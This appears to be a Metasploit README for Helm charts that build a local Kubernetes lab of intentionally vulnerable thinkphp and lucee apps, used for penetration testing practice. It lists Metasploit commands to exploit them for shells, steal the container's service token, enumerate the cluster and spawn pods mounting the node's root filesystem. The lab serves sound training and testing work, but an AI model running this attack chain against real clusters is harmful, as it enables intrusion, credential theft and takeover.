### Kubernetes

A collection of [Helm](https://helm.sh/) charts have been created to aid both Metasploit developers and pentesters explore Metasploit's
Kubernetes support. These charts can help provision your local Kubernetes environment with intentionally vulnerable applications,
which can be exploited using Metasploit modules.

## Usage

### Requirements

Kubernetes is installed on your host machine with either [kind](https://kind.sigs.k8s.io/docs/user/quick-start/#installation),
[Minikube](https://minikube.sigs.k8s.io/docs/start/), [Docker Desktop](https://docs.docker.com/desktop/kubernetes/), or alternatives.

If you are using Kind, you will need to create a cluster ahead of time:

```
kind create cluster
```

Kubectl and Helm will also need to be available on your path, an example of installing these tools can be found within the
example [Dockerfile](./Dockerfile).

### Installing

The provided `Makefile` will have all of the required commands available for setting up your environment:

```
make help
```

Next install the vulnerable charts and configuration:

```
make install
```

If you are on a Mac environment, you can optionally use the `docker-compose` setup:

```
docker-compose run setup
```

It is also possible to enter into an interactive environment with the required Helm/Kubectl tools available:

```
$ docker-compose run --service-ports setup /bin/sh
kubectl get all --all-namespaces
helm list
make install
```

## Available Charts

### secrets

Create multiple Kubernetes Secrets to test Metasploit's enumeration capabilities:

```
make secrets
```

### thinkphp

Run an intentionally vulnerable `thinkphp` application with full cluster access:

```
make thinkphp
```

Forwarding to host on port 9001:
```
make forward-thinkphp
```

Exploitation will result in a Meterpreter session with full cluster access:
```
use unix/webapp/thinkphp_rce
run http://target_ip:9001
```

### lucee

Run an intentionally vulnerable `lucee` application with a default service account with minimal access:
```
make lucee
```

Forwarding to host on port 9002:
```
make forward-lucee
```

Exploitation will result in a cmd shell session with a default service account with minimal access:
```
use linux/http/lucee_admin_imgprocess_file_write
run http://target_ip:9002 lhost=...
```

### Workflow Example

First configure the Kubernetes environment:
```
make install
```

Now expose the exploitable thinkphp application to your host machine. In the real world this step would not be required
as the application would be most likely already be publicly accessible:

```
make forward-thinkphp
```

Open Metasploit and exploit the thinkphp container to open a Metarpreter session:

```
use unix/webapp/thinkphp_rce
run http://target_ip:9001
```

The `auxiliary/cloud/kubernetes/enum_kubernetes` module can now be used to pivot through the compromised container to reach
the previously inaccessible Kubernetes API. In this scenario the container's Kubernetes service token will be read from the
file system, and used to authenticate with the Kubernetes API:

```
use auxiliary/cloud/kubernetes/enum_kubernetes
run session=-1
```

If the compromised service token has the required permissions to create new pods, it is possible to open additional Metasploit sessions and
run one-of tasks with the `exploit/multi/kubernetes/exec` module. This newly created pod will also attempt to mount the Kubernetes Node's
root filesystem to `/host_mnt`, which may lead to additional attack vectors:

```
use exploit/multi/kubernetes/exec
run session=-1
```

See the corresponding documentation for each module for more detail.

## Kubernetes Dashboard

To access the Kubernetes dashboard:

```
make dashboard
make forward-dashboard
```

Now visit https://localhost:9443, and select the token option. To generate an admin token will full access to the cluster:

```
make admin-token
```
